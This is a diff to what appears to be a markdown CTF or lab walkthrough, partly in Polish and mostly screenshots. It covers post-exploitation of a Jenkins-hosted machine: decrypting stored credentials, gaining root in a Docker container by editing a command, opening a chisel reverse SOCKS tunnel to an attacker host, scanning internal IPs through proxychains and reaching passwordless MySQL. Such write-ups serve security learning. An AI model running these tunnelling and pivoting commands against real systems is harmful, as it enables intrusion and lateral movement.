@@ -38,4 +38,54 @@ We also need `master.key` and `hudson.util.Secret`
 
 I used [jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor) to decrypt the password.
 
+![{79F79128-DBDA-481F-9E6D-4CAA2CD3915B}](https://github.com/user-attachments/assets/65ea9472-7a45-493e-bcc8-c942ef4ede37)
+
+It works!
+
+![{ECB87EC1-51C2-4489-9A03-4E5449BBF0B3}](https://github.com/user-attachments/assets/151feba0-4a68-4e87-b0bf-7a51504385d4)
+
+Duży tych pliczków nie mamy, ale jak znam życie to to nawet prosty hook nie będzie tylko edycja tej komendy.
+
+![{49386F7F-6E9D-484D-8F29-A3D7CA0CD154}](https://github.com/user-attachments/assets/402c23b3-d0aa-4bd4-9432-223d13f4ab6c)
+
+![{8E79EAC7-D09B-48D1-A234-0429DBC7A19D}](https://github.com/user-attachments/assets/d2596929-9da4-4a8c-a34a-f4957f135805)
+
+save and wait ~60-120sek
+
+![{3AB9CB23-8DA5-4A78-8A8B-234B70B73E03}](https://github.com/user-attachments/assets/e157557e-91f7-479d-925d-0297a43c0670)
+
+root na dockerze.
+
+Pobieramy chisel'a
+
+![{9F9C62C5-DE12-490B-9E02-DE00A997A6DD}](https://github.com/user-attachments/assets/6f8316c7-0ffe-4ced-b00d-3383db7f059b)
+
+on docker
+```
+./chisel client 10.8.4.124:8000 R:socks
+```
+on my host
+```
+./chisel server --reverse --port 8000 --socks5
+```
+
+run port scan
+```
+proxychains4 -q nmap -Pn -v 172.18.0.1 172.18.0.2
+```
+
+![{D0AA01CD-F486-4054-80BA-8BFE075C334B}](https://github.com/user-attachments/assets/e13aa2e0-4605-498e-bb50-6bf5dc6a807b)
+
+
+We are able to connect to mysql without password.
+
+![{EADB8D67-8FDB-4F61-A4E7-2F9B3DAEEF08}](https://github.com/user-attachments/assets/436c78f6-cf9f-4aef-a613-dc472c7ae142)
+
+![{3A32DD89-B0BA-4785-B2DB-789E63622A67}](https://github.com/user-attachments/assets/a721e35c-6696-471e-bc3a-b6a51d7bd1aa)
+
+![{83C8F66A-64D2-4DE4-9F26-4A63214A7BEC}](https://github.com/user-attachments/assets/504efd07-ea2d-40fc-a9e1-080db55c0164)
+
+But before cracking I found some interesting IPs
+
+![{80D05ECC-88A6-4D5A-9DE5-2B0F8541EF54}](https://github.com/user-attachments/assets/cbdddb18-e3ac-42bb-8e19-44951f2e6eca)
 
